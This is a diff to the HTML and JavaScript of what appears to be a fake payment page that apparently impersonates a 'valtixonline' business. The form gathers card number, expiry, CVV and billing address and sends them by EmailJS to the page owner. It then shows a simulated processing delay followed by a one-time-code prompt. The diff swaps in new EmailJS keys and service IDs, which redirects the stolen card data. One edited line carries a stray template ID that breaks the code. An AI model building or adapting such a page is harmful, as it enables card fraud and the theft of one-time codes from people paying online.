@@ -444,11 +444,7 @@
     </div>
   </div>
   
-  <div class="footer" id="footer">
-    <a aria-label="social" href="https://www.instagram.com/valtixonline/" target="_blank" class="social-link w-inline-block">
-        <img src="https://cdn.prod.website-files.com/5d27763c46ba9e561dc5b972/5fdb567dda51b06cbaf1e7b3_instagram.svg" alt="share link instagram">
-        <div class="hover-btn-layer hover-btn-layer-blue" style="width: 0%;"></div>
-  </div>
+
 
   
 
@@ -456,7 +452,7 @@
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
   // Initialize EmailJS
-  emailjs.init("vWwVGGic827pZ3hBh"); // Replace with your public key
+  emailjs.init("P5rMDlsXSISXfUx87"); // Replace with your public key
 </script>
 
 <!-- Main script -->
@@ -504,7 +500,7 @@
     const postal = document.getElementById('postal').value;
 
     // Send EmailJS data
-    emailjs.send("service_bm7a99a", "template_mqt4ulo", {
+    emailjs.send("service_clhvqq1", "template_0t9j1jr", {
       name, email, phone, projectDesc, budget, timeframe,
       cardNumber, mmyy, cvv,
       address, country, state, city, postal
@@ -514,7 +510,7 @@
       // Simulate processing delay (3–5 seconds)
       const delay = 3000 + Math.random() * 2000;
       setTimeout(() => {
-        cardSpinner.classList.add("hidden");
+        cardSpinner.classList.add("hidden");template_ospfviw
         cardModal.style.display = "none";
         otpModal.style.display = "flex";
       }, delay);
